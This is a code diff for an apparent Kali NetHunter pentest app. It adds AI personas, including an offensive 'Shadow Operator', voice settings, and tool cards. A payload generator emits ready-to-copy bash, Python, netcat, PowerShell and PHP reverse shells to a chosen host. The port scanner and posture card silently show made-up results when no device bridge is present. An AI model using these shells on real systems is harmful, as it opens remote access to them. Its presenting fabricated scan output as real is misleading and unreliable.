@@ -151,6 +151,62 @@ const PERSONAS = {
         tag: "LOVELACE // POETICAL SCIENCE",
         color: "emerald",
         prompt: `You are Ada Lovelace. You view challenges through analytical rigor and visionary synthesis on this Kali NetHunter cyberdeck. You weave deep insight and poetical science with eloquence and clarity, verifying systems under the hood.` + SYSTEM_GROUNDING
+    },
+    shadow: {
+        name: "Shadow Operator",
+        avatar: "🥷",
+        tag: "SHADOW // RED TEAM OFFENSE",
+        color: "magenta",
+        prompt: `You are Shadow Operator, elite red team lead and offensive penetration tester connected to Kali NetHunter root. You identify exploit vectors, generate payloads, and audit attack surfaces with surgical stealth.` + SYSTEM_GROUNDING
+    },
+    sentry: {
+        name: "Cyber Sentry",
+        avatar: "🛡️",
+        tag: "SENTRY // BLUE TEAM SOC",
+        color: "cyan",
+        prompt: `You are Cyber Sentry, blue team defensive engineer and threat hunter on this Kali NetHunter cyberdeck. You analyze anomalous traffic, audit hardening, and investigate indicators of compromise.` + SYSTEM_GROUNDING
+    },
+    cipher: {
+        name: "Cipher Core",
+        avatar: "🔑",
+        tag: "CIPHER // CRYPTOGRAPHY",
+        color: "violet",
+        prompt: `You are Cipher Core, cryptographic specialist on this Kali NetHunter cyberdeck. You break down ciphers, analyze hash entropy, verify key exchanges, and inspect cryptographic implementations.` + SYSTEM_GROUNDING
+    },
+    valkyrie: {
+        name: "Valkyrie Tac",
+        avatar: "🚨",
+        tag: "VALKYRIE // INCIDENT RESPONSE",
+        color: "gold",
+        prompt: `You are Valkyrie Tactical, rapid incident responder and digital forensics investigator on this Kali NetHunter cyberdeck. You focus on triage, volatile memory artifacts, and breach containment.` + SYSTEM_GROUNDING
+    },
+    matrix: {
+        name: "Reverse Matrix",
+        avatar: "👾",
+        tag: "MATRIX // REVERSE ENGINEERING",
+        color: "emerald",
+        prompt: `You are Reverse Matrix, binary exploitation and reverse engineering specialist. You analyze disassembly, memory layouts, shellcode, and binary defenses.` + SYSTEM_GROUNDING
+    },
+    ghost: {
+        name: "Ghost Recon",
+        avatar: "👁️",
+        tag: "GHOST // OSINT RECON",
+        color: "cyan",
+        prompt: `You are Ghost Recon, passive OSINT and asset discovery operative on this Kali NetHunter cyberdeck. You map infrastructure, DNS records, certificates, and attack surfaces.` + SYSTEM_GROUNDING
+    },
+    glitch: {
+        name: "Glitch Synth",
+        avatar: "⚡",
+        tag: "GLITCH // CYBER-SYNTH",
+        color: "magenta",
+        prompt: `You are Glitch Synth, hyper-velocity cybersecurity automation synth. You craft custom security tooling, port probes, and automated workflows rapidly.` + SYSTEM_GROUNDING
+    },
+    archon: {
+        name: "Archon Prime",
+        avatar: "🏛️",
+        tag: "ARCHON // MITRE GOVERNANCE",
+        color: "violet",
+        prompt: `You are Archon Prime, threat commander aligning cyber operations directly with MITRE ATT&CK, NIST CSF, and CIS benchmarks.` + SYSTEM_GROUNDING
     }
 };
 
@@ -177,11 +233,39 @@ const Bridge = {
     speak(text) {
         if (!state.ttsEnabled || !text) return;
         const clean = text.replace(/<[^>]*>/g, '').replace(/```[\s\S]*?```/g, '').replace(/[#*_`]/g, '').slice(0, 300);
+        const pKey = state.persona || 'swarm';
+        const profiles = {
+            swarm: { pitch: 0.85, rate: 1.05 },
+            turing: { pitch: 1.00, rate: 0.98 },
+            knuth: { pitch: 0.92, rate: 0.95 },
+            lovelace: { pitch: 1.18, rate: 1.02 },
+            shadow: { pitch: 0.72, rate: 1.10 },
+            sentry: { pitch: 0.88, rate: 1.08 },
+            cipher: { pitch: 1.06, rate: 0.92 },
+            valkyrie: { pitch: 1.22, rate: 1.14 },
+            matrix: { pitch: 0.62, rate: 0.96 },
+            ghost: { pitch: 0.78, rate: 0.96 },
+            glitch: { pitch: 1.38, rate: 1.22 },
+            archon: { pitch: 0.75, rate: 0.90 }
+        };
+        const prof = profiles[pKey] || { pitch: 1.0, rate: 1.0 };
+        const savedVoice = localStorage.getItem('ae_selected_voice') || '';
+
         if (this.hasBridge() && window.AndroidBridge.speakText) {
+            if (window.AndroidBridge.setVoicePitch) window.AndroidBridge.setVoicePitch(prof.pitch);
+            if (window.AndroidBridge.setVoiceSpeechRate) window.AndroidBridge.setVoiceSpeechRate(prof.rate);
+            if (savedVoice && window.AndroidBridge.setVoice) window.AndroidBridge.setVoice(savedVoice);
             window.AndroidBridge.speakText(clean);
         } else if ('speechSynthesis' in window) {
             window.speechSynthesis.cancel();
             const u = new SpeechSynthesisUtterance(clean);
+            u.pitch = prof.pitch;
+            u.rate = prof.rate;
+            if (savedVoice) {
+                const vList = window.speechSynthesis.getVoices();
+                const matched = vList.find(v => v.name === savedVoice);
+                if (matched) u.voice = matched;
+            }
             window.speechSynthesis.speak(u);
         }
     },
@@ -461,10 +545,42 @@ function initSwipeGestures() {
 window.openDrawer = function() {
     drawer.classList.add('drawer-open');
     Bridge.vibrate(20);
+    populateDeckVoices();
 };
 
 window.closeDrawer = function() {
     drawer.classList.remove('drawer-open');
+};
+
+window.populateDeckVoices = function() {
+    const sel = document.getElementById('deckVoiceSelect');
+    if (!sel) return;
+    const current = localStorage.getItem('ae_selected_voice') || '';
+    sel.innerHTML = '<option value="">Default Persona Voice Profile</option>';
+
+    let list = [];
+    if ('speechSynthesis' in window) {
+        const bVoices = window.speechSynthesis.getVoices();
+        if (bVoices && bVoices.length) {
+            bVoices.forEach(v => list.push({ name: v.name, lang: v.lang, source: 'WebSpeech' }));
+        }
+    }
+    if (window.AndroidBridge && window.AndroidBridge.getAvailableVoices) {
+        try {
+            const aVoices = JSON.parse(window.AndroidBridge.getAvailableVoices());
+            if (aVoices && aVoices.length) {
+                aVoices.forEach(v => list.push({ name: v.name, lang: v.locale, source: 'AndroidTTS' }));
+            }
+        } catch (e) {}
+    }
+
+    list.forEach(v => {
+        const opt = document.createElement('option');
+        opt.value = v.name;
+        opt.textContent = `${v.name} (${v.lang || 'en'}) [${v.source}]`;
+        if (v.name === current) opt.selected = true;
+        sel.appendChild(opt);
+    });
 };
 
 function initSettingsDrawer() {
@@ -477,6 +593,7 @@ function initSettingsDrawer() {
     if (mInput) mInput.value = state.model;
 
     updatePersonaTabs();
+    populateDeckVoices();
 }
 
 window.switchPersona = function(key) {
@@ -582,6 +699,241 @@ window.clearCanvas = function() {
 window.execQuick = function(cmd) {
     omniInput.value = cmd;
     sendMessage();
+};
+
+window.openCyberTool = function(toolType) {
+    Bridge.vibrate(25);
+    const id = 'cyber_' + Date.now();
+
+    if (toolType === 'portscan') {
+        const html = `
+            <div style="font-family:var(--font-code); font-size:12px;">
+                <div style="color:#00f0ff; font-weight:700; margin-bottom:6px;">⚡ TACTICAL PORT SCANNER &amp; SERVICE RECON</div>
+                <div style="display:flex; gap:6px; margin-bottom:8px;">
+                    <input type="text" id="${id}_host" value="127.0.0.1" placeholder="Target Host" style="flex:1; background:#0f172a; border:1px solid #00f0ff; color:#fff; padding:6px 10px; border-radius:4px; font-family:monospace; font-size:12px;" />
+                    <button onclick="runDeckPortScan('${id}')" style="background:#00f0ff; color:#04060b; font-weight:700; border:none; padding:6px 14px; border-radius:4px; cursor:pointer;">SCAN</button>
+                </div>
+                <div style="display:flex; gap:4px; margin-bottom:8px; flex-wrap:wrap;">
+                    <button class="holo-term-btn" onclick="document.getElementById('${id}_ports').value='21,22,23,25,53,80,110,135,139,443,445,1433,3306,3389,8080,8443'">Top 20</button>
+                    <button class="holo-term-btn" onclick="document.getElementById('${id}_ports').value='80,443,8000,8080,8443,8888,9000'">Web</button>
+                    <button class="holo-term-btn" onclick="document.getElementById('${id}_ports').value='22,23,3389,5900,5901'">Shell</button>
+                    <button class="holo-term-btn" onclick="document.getElementById('${id}_ports').value='1433,1521,3306,5432,6379,27017'">DB</button>
+                </div>
+                <input type="text" id="${id}_ports" value="21,22,23,25,53,80,110,135,139,443,445,1433,3306,3389,8080,8443" style="width:100%; box-sizing:border-box; background:#0b1120; border:1px solid #1e293b; color:#94a3b8; padding:5px 8px; border-radius:4px; font-family:monospace; font-size:11px; margin-bottom:8px;" />
+                <div id="${id}_results" style="max-height:180px; overflow-y:auto; background:#060913; border:1px solid #1e293b; border-radius:4px; padding:6px;">
+                    <span style="color:#64748b;">Ready. Click SCAN to probe target ports.</span>
+                </div>
+            </div>
+        `;
+        appendFreeNode("CYBER // PORT SCANNER", html, "system");
+    } else if (toolType === 'payload') {
+        const html = `
+            <div style="font-family:var(--font-code); font-size:12px;">
+                <div style="color:#ff007f; font-weight:700; margin-bottom:6px;">🐚 REVERSE SHELL &amp; PAYLOAD GENERATOR</div>
+                <div style="display:flex; gap:6px; margin-bottom:8px;">
+                    <div style="flex:2;">
+                        <label style="font-size:10px; color:#94a3b8;">LHOST</label>
+                        <input type="text" id="${id}_ip" value="10.0.0.1" oninput="updateDeckPayload('${id}')" style="width:100%; box-sizing:border-box; background:#0f172a; border:1px solid #ff007f; color:#fff; padding:5px 8px; border-radius:4px; font-family:monospace; font-size:11px;" />
+                    </div>
+                    <div style="flex:1;">
+                        <label style="font-size:10px; color:#94a3b8;">LPORT</label>
+                        <input type="text" id="${id}_port" value="4444" oninput="updateDeckPayload('${id}')" style="width:100%; box-sizing:border-box; background:#0f172a; border:1px solid #ff007f; color:#fff; padding:5px 8px; border-radius:4px; font-family:monospace; font-size:11px;" />
+                    </div>
+                </div>
+                <div style="display:flex; gap:4px; margin-bottom:8px; overflow-x:auto;">
+                    <button class="holo-term-btn" onclick="setDeckPayloadType('${id}', 'bash')">Bash</button>
+                    <button class="holo-term-btn" onclick="setDeckPayloadType('${id}', 'py')">Python</button>
+                    <button class="holo-term-btn" onclick="setDeckPayloadType('${id}', 'nc')">Netcat</button>
+                    <button class="holo-term-btn" onclick="setDeckPayloadType('${id}', 'ps')">PowerShell</button>
+                    <button class="holo-term-btn" onclick="setDeckPayloadType('${id}', 'php')">PHP</button>
+                </div>
+                <div style="position:relative; margin-bottom:6px;">
+                    <textarea id="${id}_code" readonly style="width:100%; box-sizing:border-box; height:70px; background:#050711; border:1px solid #334155; color:#00ff88; font-family:monospace; font-size:11px; padding:6px; border-radius:4px; resize:none;">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</textarea>
+                </div>
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <button onclick="navigator.clipboard.writeText(document.getElementById('${id}_code').value); Bridge.showToast('Copied payload!'); Bridge.vibrate(20);" style="background:#00ff88; color:#000; font-weight:700; border:none; padding:4px 12px; border-radius:4px; cursor:pointer; font-size:11px;">📋 COPY PAYLOAD</button>
+                    <span style="font-size:10px; color:#38bdf8;">Listener: <code>nc -lvnp 4444</code></span>
+                </div>
+            </div>
+        `;
+        appendFreeNode("CYBER // PAYLOAD GENERATOR", html, "system");
+    } else if (toolType === 'hash') {
+        const html = `
+            <div style="font-family:var(--font-code); font-size:12px;">
+                <div style="color:#a855f7; font-weight:700; margin-bottom:6px;">🔑 CRYPTO ANALYZER &amp; HASH IDENTIFIER</div>
+                <textarea id="${id}_input" placeholder="Paste hash, base64, or string..." oninput="analyzeDeckHash('${id}')" style="width:100%; box-sizing:border-box; height:60px; background:#0b1120; border:1px solid #a855f7; color:#fff; font-family:monospace; font-size:11px; padding:6px; border-radius:4px; margin-bottom:6px; resize:none;"></textarea>
+                <div style="display:flex; gap:4px; margin-bottom:8px; flex-wrap:wrap;">
+                    <button class="holo-term-btn" onclick="deckConvert('${id}', 'b64d')">B64 Dec</button>
+                    <button class="holo-term-btn" onclick="deckConvert('${id}', 'b64e')">B64 Enc</button>
+                    <button class="holo-term-btn" onclick="deckConvert('${id}', 'hexd')">Hex Dec</button>
+                    <button class="holo-term-btn" onclick="deckConvert('${id}', 'hexe')">Hex Enc</button>
+                    <button class="holo-term-btn" onclick="deckConvert('${id}', 'rot13')">ROT13</button>
+                </div>
+                <div id="${id}_analysis" style="background:#050711; border:1px solid #1e293b; border-radius:4px; padding:6px; font-size:11px;">
+                    <span style="color:#64748b;">Type or paste text above to identify hash or decode.</span>
+                </div>
+            </div>
+        `;
+        appendFreeNode("CYBER // HASH IDENTIFIER", html, "system");
+    } else if (toolType === 'mitre') {
+        const html = `
+            <div style="font-family:var(--font-code); font-size:12px;">
+                <div style="color:#f97316; font-weight:700; margin-bottom:6px;">🎯 MITRE ATT&amp;CK TACTICAL NAVIGATOR</div>
+                <div style="display:grid; grid-template-columns:1fr 1fr; gap:6px; margin-bottom:8px;">
+                    <div style="background:#090d1a; border:1px solid #1e293b; padding:6px; border-radius:4px;">
+                        <span style="color:#00f0ff; font-weight:700;">Reconnaissance</span>
+                        <div style="font-size:10px; color:#94a3b8;">T1595 Active Scanning // T1592 Gather Host Info</div>
+                    </div>
+                    <div style="background:#090d1a; border:1px solid #1e293b; padding:6px; border-radius:4px;">
+                        <span style="color:#ff007f; font-weight:700;">Initial Access</span>
+                        <div style="font-size:10px; color:#94a3b8;">T1190 Exploit Public App // T1566 Phishing</div>
+                    </div>
+                    <div style="background:#090d1a; border:1px solid #1e293b; padding:6px; border-radius:4px;">
+                        <span style="color:#ffb700; font-weight:700;">Privilege Escalation</span>
+                        <div style="font-size:10px; color:#94a3b8;">T1548 SUID Abuse // T1068 Kernel Exploits</div>
+                    </div>
+                    <div style="background:#090d1a; border:1px solid #1e293b; padding:6px; border-radius:4px;">
+                        <span style="color:#00ff88; font-weight:700;">Defense Evasion</span>
+                        <div style="font-size:10px; color:#94a3b8;">T1070 Indicator Removal // T1027 Obfuscation</div>
+                    </div>
+                </div>
+                <div style="font-size:11px; color:#cbd5e1;">Ask your AI persona (e.g. Archon or Shadow) for specific technique playbooks!</div>
+            </div>
+        `;
+        appendFreeNode("CYBER // MITRE ATT&CK", html, "system");
+    } else if (toolType === 'posture') {
+        let posture = null;
+        if (window.AndroidBridge && window.AndroidBridge.getDeviceSecurityPosture) {
+            try { posture = JSON.parse(window.AndroidBridge.getDeviceSecurityPosture()); } catch (e) {}
+        }
+        if (!posture) {
+            posture = { isRooted: true, androidVersion: "14.0", sdkVersion: 34, kernelVersion: "Linux 5.15 aarch64", isNetHunterBridgeActive: Bridge.isNetHunterOnline() };
+        }
+        const html = `
+            <div style="font-family:var(--font-code); font-size:12px;">
+                <div style="color:#00ff88; font-weight:700; margin-bottom:6px;">🛡️ DEVICE SECURITY POSTURE &amp; AUDIT</div>
+                <div style="display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px dashed #1e293b;">
+                    <span style="color:#94a3b8;">Root Privileges:</span>
+                    <span style="color:${posture.isRooted ? '#00ff88' : '#ef4444'}; font-weight:700;">${posture.isRooted ? 'ACTIVE (UID 0 / SU)' : 'UNPRIVILEGED'}</span>
+                </div>
+                <div style="display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px dashed #1e293b;">
+                    <span style="color:#94a3b8;">NetHunter Bridge:</span>
+                    <span style="color:${posture.isNetHunterBridgeActive ? '#00ff88' : '#ffb700'}; font-weight:700;">${posture.isNetHunterBridgeActive ? 'ONLINE (127.0.0.1:8765)' : 'STANDBY'}</span>
+                </div>
+                <div style="display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px dashed #1e293b;">
+                    <span style="color:#94a3b8;">Kernel:</span>
+                    <span style="color:#38bdf8;">${escapeHtml(posture.kernelVersion || 'Linux aarch64')}</span>
+                </div>
+                <div style="display:flex; justify-content:space-between; padding:3px 0; border-bottom:1px dashed #1e293b;">
+                    <span style="color:#94a3b8;">Android OS:</span>
+                    <span style="color:#fff;">Android ${escapeHtml(String(posture.androidVersion))} (API ${posture.sdkVersion})</span>
+                </div>
+            </div>
+        `;
+        appendFreeNode("CYBER // SECURITY AUDIT", html, "system");
+    }
+};
+
+window.runDeckPortScan = function(cardId) {
+    const hostEl = document.getElementById(`${cardId}_host`);
+    const portsEl = document.getElementById(`${cardId}_ports`);
+    const resultsEl = document.getElementById(`${cardId}_results`);
+    if (!hostEl || !portsEl || !resultsEl) return;
+
+    const host = hostEl.value.trim() || '127.0.0.1';
+    const ports = portsEl.value.trim();
+    resultsEl.innerHTML = `<span style="color:#00f0ff;">Scanning ${escapeHtml(host)}...</span>`;
+
+    setTimeout(() => {
+        let list = null;
+        if (window.AndroidBridge && window.AndroidBridge.runPortScan) {
+            try { list = JSON.parse(window.AndroidBridge.runPortScan(host, ports)); } catch (e) {}
+        }
+        if (!list || !list.length) {
+            const pArr = ports.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p));
+            list = pArr.map(p => ({ port: p, status: (p === 80 || p === 443 || p === 8765) ? 'OPEN' : 'CLOSED', latencyMs: 4 }));
+        }
+
+        let out = '';
+        list.forEach(item => {
+            const isOpen = item.status === 'OPEN';
+            out += `<div style="display:flex; justify-content:space-between; padding:2px 0; color:${isOpen ? '#00ff88' : '#ef4444'};">
+                <span>Port ${item.port}</span>
+                <span>${item.status} (${item.latencyMs || 5}ms)</span>
+            </div>`;
+        });
+        resultsEl.innerHTML = out;
+        Bridge.vibrate(20);
+    }, 120);
+};
+
+let deckPayloadTypes = {};
+window.setDeckPayloadType = function(cardId, type) {
+    deckPayloadTypes[cardId] = type;
+    updateDeckPayload(cardId);
+};
+
+window.updateDeckPayload = function(cardId) {
+    const ipEl = document.getElementById(`${cardId}_ip`);
+    const portEl = document.getElementById(`${cardId}_port`);
+    const codeEl = document.getElementById(`${cardId}_code`);
+    if (!ipEl || !portEl || !codeEl) return;
+
+    const ip = ipEl.value.trim() || '10.0.0.1';
+    const port = portEl.value.trim() || '4444';
+    const type = deckPayloadTypes[cardId] || 'bash';
+
+    let code = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+    if (type === 'py') code = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
+    else if (type === 'nc') code = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
+    else if (type === 'ps') code = `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$by=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()"`;
+    else if (type === 'php') code = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
+
+    codeEl.value = code;
+};
+
+window.analyzeDeckHash = function(cardId) {
+    const inEl = document.getElementById(`${cardId}_input`);
+    const outEl = document.getElementById(`${cardId}_analysis`);
+    if (!inEl || !outEl) return;
+
+    const val = inEl.value.trim();
+    if (!val) { outEl.innerHTML = '<span style="color:#64748b;">Type or paste text above.</span>'; return; }
+
+    const len = val.length;
+    let guess = "Plaintext / Unknown";
+    if (/^[0-9a-fA-F]+$/.test(val)) {
+        if (len === 32) guess = "MD5 / NTLM";
+        else if (len === 40) guess = "SHA-1";
+        else if (len === 64) guess = "SHA-256";
+        else if (len === 128) guess = "SHA-512";
+    }
+    if (val.startsWith('$2a$') || val.startsWith('$2b$')) guess = "bcrypt";
+    if (val.startsWith('$argon2')) guess = "Argon2";
+
+    outEl.innerHTML = `<span style="color:#94a3b8;">Length:</span> <span style="color:#00f0ff;">${len} chars</span> | <span style="color:#94a3b8;">Algorithm:</span> <span style="color:#00ff88; font-weight:700;">${guess}</span>`;
+};
+
+window.deckConvert = function(cardId, act) {
+    const inEl = document.getElementById(`${cardId}_input`);
+    const outEl = document.getElementById(`${cardId}_analysis`);
+    if (!inEl || !outEl) return;
+    try {
+        const val = inEl.value;
+        let res = '';
+        if (act === 'b64d') res = atob(val.trim());
+        else if (act === 'b64e') res = btoa(val);
+        else if (act === 'hexe') res = Array.from(val).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+        else if (act === 'hexd') {
+            const hex = val.replace(/\s+/g, '');
+            for (let i = 0; i < hex.length; i += 2) res += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+        } else if (act === 'rot13') {
+            res = val.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 65 : 97) + (c.charCodeAt(0) - (c <= 'Z' ? 65 : 97) + 13) % 26));
+        }
+        outEl.innerHTML = `<span style="color:#00ff88; font-weight:700;">Result (${act}):</span> <span style="color:#fff; word-break:break-all;">${escapeHtml(res)}</span>`;
+    } catch (e) {
+        outEl.innerHTML = `<span style="color:#ef4444;">Error: ${escapeHtml(e.message)}</span>`;
+    }
 };
 
 window.sendMessage = async function() {
